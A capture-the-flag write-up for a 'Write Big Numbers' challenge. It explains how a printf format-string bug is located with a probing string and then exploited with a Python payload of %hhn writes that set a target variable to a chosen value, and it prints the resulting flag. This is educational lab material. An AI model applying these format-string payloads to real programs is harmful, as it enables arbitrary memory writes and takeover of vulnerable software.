# Challenge `Write Big Numbers` Writeup

- Vulnerability: 
  - Format strings
- Where:
  - printf function
- Impact:
  - allows to write in arbitrary memory

## Analyzing the server

The main function reads the user input to a buffer then based on the target value it prints the flag or writes an error message.

## Exploit

By running `gdb` its possible to find the address of the `target` variable. 
Sending the following format string
```
"AAAA.%08x.%08x.%08x.%08x.%08x.%08x.%08x"
```
and verifying that the 7th register is filled with `41` (the value of `A`) tell us that we control the 7th register.
Now we can write the address of the target variable to this register and then use the `%n` specifier to write anything there. 
This time we have to write a specific value to the `target` variable, `0x0f5f1aa9`. Since `%n` specifier writes the number of characters written so far, we must write the values in crescent order.
First we write in the address+3 the value `0f` and then in the address+1 the value `1a` and so on.
```python
payload =  p32(adr+3) + b'%11c' + b'%007$hhn'
payload += p32(adr+1) + b'%07c' + b'%011$hhn'
payload += p32(adr+2) + b'%65c' + b'%015$hhn'
payload += p32(adr)   + b'%70c' + b'%019$hhn'
```
There are two main challenges, the first one is writing the specific value and the second one is writing in the correct register.
By translating the individual values to integers we can see that the first value `0x0f` is `15` meaning that we write 4 bytes for the address plus 11 characters (`%11c`) to the 7th register. Then we want to write `0x1a` which is `26` so we have to write 26-15=11 characters, 4 bytes for the address plus 7 characters (`%07c`) and to compute the correct register we add 4 to the previous register because:
```
           7th           8th         9th 10th registers
            |-------------|-----------|---|
            v             v           v   v
payload =  p32(adr+3) + b'%11c' + b'%007$hhn'
payload += p32(adr+1) + b'%07c' + b'%011$hhn'
            ^
            |----------
            11th register
```
and so on.
Revealing the flag `SSof{And_write_BIIIIIG_numbers_Very_BIG}`

## Implementation

Full implementation can be found [here](write-big-numbers.py).
